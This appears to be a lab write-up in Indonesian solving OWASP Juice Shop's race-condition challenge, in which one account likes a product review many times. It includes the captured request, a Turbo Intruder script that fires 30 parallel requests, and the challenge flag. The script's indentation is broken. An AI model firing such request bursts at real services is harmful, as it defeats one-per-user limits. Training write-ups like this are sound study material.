# Proof of Concept: Multiple Likes Race Condition

**Target:** OWASP Juice Shop

**Category:** Race Condition / Broken Access Control

---

## 1. Deskripsi Challenge

Aplikasi membatasi setiap pengguna hanya dapat memberikan satu like pada review produk.
Namun, karena adanya **race condition**, beberapa request like dapat dikirim secara bersamaan sehingga server memproses lebih dari satu like sebelum validasi selesai.

---

## 2. Analisis Masalah

Endpoint berikut digunakan untuk memberikan like:

```
POST /rest/products/reviews
```

Request body berisi ID review:

```json
{"id":"REVIEW_ID"}
```

Server memeriksa apakah user sudah memberikan like, tetapi pemeriksaan dilakukan **setelah** request diproses secara paralel, sehingga beberapa request yang dikirim sangat cepat tetap diterima.

---

## 3. Langkah Penyelesaian (Exploitation)

### 1. Akses Browser 

1. Login menggunakan akun yang ada ke OWASP Juice
2. Pastikan bahwa browser telah terkait dengan proxy burp
3. pilih salah satu produk yang ingin di like


### 2. instalasi Ekstensi & Intercept Request

1. Masuk ke Burp suite
2. Pilih Tab Extensions lalu pilih BApp store
3. Cari Turbo Intruder dan install
4. Kembali ke Tab Proxy dan aktifkan Burp Proxy dengan mengklik intercept.
5. Kembali ke OWASP Juice dan like salah satu review produk.
6. Setelah itu cek kembali burp suite dan tangkap request berikut:

```
POST /rest/products/reviews HTTP/1.1
Host: TARGET
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"id":"REVIEW_ID"}
```
<img width="1387" height="304" alt="image" src="https://github.com/user-attachments/assets/a6cb5ba3-be2f-49d9-bb23-84048f86d7e2" />

### 2. Kirim ke Turbo Intruder

1. Klik kanan pada request yang dipilih
2. pilih extensions lalu pilih turbo intruder dan pilih Bulk Turbo
<img width="1387" height="417" alt="image" src="https://github.com/user-attachments/assets/045cd9d9-eef2-43eb-b8df-42e5d91d9dc8" />


### 3. Gunakan Script Turbo Intruder

1. Ketika masuk ke tampilan turbo intruder akan muncul scrip ptyhon seperti berikut

```def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)

    engine.queue(target.req)

```
2. Ganti menjadi seperti berikut ini
```def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)

       for i in range(30):
           engine.queue(target.req)


   def handleResponse(req, interesting):
       table.add(req)

```

### 4. Jalankan Attack

Klik **Attack** Lalu tunggu hingga selesai
Turbo Intruder akan mengirim 30 request secara paralel sehingga server mencatat lebih dari satu like.

---

## 5. Flag (Evidence)

Berikut adalah bukti bahwa 1 akun dapat melakukan lebih dari 1 kali like pada ulasan suatu produk:
## e6334118280c7b75de8e2ef6a11bb172b2e34f13
<img width="1282" height="827" alt="image" src="https://github.com/user-attachments/assets/b8cb0c76-833c-4676-9b78-c0349695da84" />
<img width="1717" height="129" alt="image" src="https://github.com/user-attachments/assets/c07e1157-fce8-4335-9737-5bd54f5d5e65" />


---
